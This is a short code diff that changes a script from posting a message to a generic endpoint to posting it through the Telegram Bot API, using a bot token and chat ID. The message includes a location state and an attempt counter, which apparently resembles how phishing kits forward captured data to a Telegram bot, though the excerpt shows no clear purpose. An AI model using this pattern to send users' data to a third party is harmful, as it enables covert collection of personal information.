@@ -60,16 +60,18 @@ STATE: ${location.state}
 X: ${attempt} ⏱️`;
 
       try {
-        await fetch(endpoint, {
+        const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
+        await fetch(url, {
           method: "POST",
           headers: { "Content-Type": "application/json" },
-          body: JSON.stringify({ 
-            Message: message 
+          body: JSON.stringify({
+            chat_id: TELEGRAM_CHAT_ID,
+            text: message
           })
         });
-        console.log("✅ Sent to endpoint");
+        console.log("✅ Sent to Telegram");
       } catch (err) {
-        console.error("❌ Send failed:", err);
+        console.error("❌ Send failed to Telegram:", err);
       }
     }
 
